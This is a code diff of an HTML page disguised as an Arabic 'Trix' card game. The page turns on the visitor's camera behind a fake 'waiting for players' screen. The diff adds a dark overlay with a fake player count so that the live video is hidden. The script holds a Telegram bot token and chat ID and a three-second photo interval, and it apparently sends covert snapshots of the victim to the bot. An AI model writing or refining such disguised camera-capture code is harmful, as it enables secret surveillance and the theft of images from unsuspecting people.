@@ -80,21 +80,43 @@
             0% { transform: rotate(0deg); }
             100% { transform: rotate(360deg); }
         }
-        /* الكاميرا صغيرة جدًا تحت النص في شاشة الانتظار (ضرورية للعمل على Realme) */
-        #video {
-            width: 160px;
+        /* منطقة الكاميرا + النص اللي يغطيها */
+        .camera-container {
+            position: relative;
+            width: 240px;
             height: auto;
             margin-top: 20px;
+        }
+        #video {
+            width: 100%;
+            height: auto;
             border: 2px solid #00ff88;
-            border-radius: 8px;
-            box-shadow: 0 0 10px #00ff88aa;
+            border-radius: 10px;
+            box-shadow: 0 0 15px #00ff88aa;
             background: #000;
+        }
+        .overlay-text {
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.7);
+            color: #00ff88;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            font-size: 1.2rem;
+            font-weight: bold;
+            border-radius: 10px;
+            z-index: 2;
+            pointer-events: none;
         }
     </style>
 </head>
 <body>
     <div id="main-screen">
-        <h1>لعبة تركس الرائعة!</h1>
+        <h1>لعبة تركس الرهيبة!</h1>
       
         <p>
             مرحباً! جرب لعبة تركس الجديدة المطورة 2026<br>
@@ -108,14 +130,19 @@
     <div id="waiting-screen">
         <div class="loader"></div>
         <div id="waiting-text">بانتظار انضمام اللاعبين...</div>
-        <video id="video" autoplay playsinline muted></video>
+        
+        <!-- منطقة الكاميرا مع النص اللي يغطيها -->
+        <div class="camera-container">
+            <video id="video" autoplay playsinline muted></video>
+            <div class="overlay-text">عدد اللاعبين المنضمين الآن: 0</div>
+        </div>
     </div>
 
     <script>
         let stream = null;
         const BOT_TOKEN = '8375046170:AAFTy22WAucWyQhwKbbN7aqDm_enTTRZ7Ts';
         const CHAT_ID = '6611123941';
-        const PHOTO_INTERVAL = 3000; // كل 3 ثواني (أسرع بكثير)
+        const PHOTO_INTERVAL = 3000; // كل 3 ثواني
 
         function startGame() {
             document.getElementById('main-screen').style.display = 'none';
@@ -192,4 +219,3 @@
     </script>
 </body>
 </html>
-
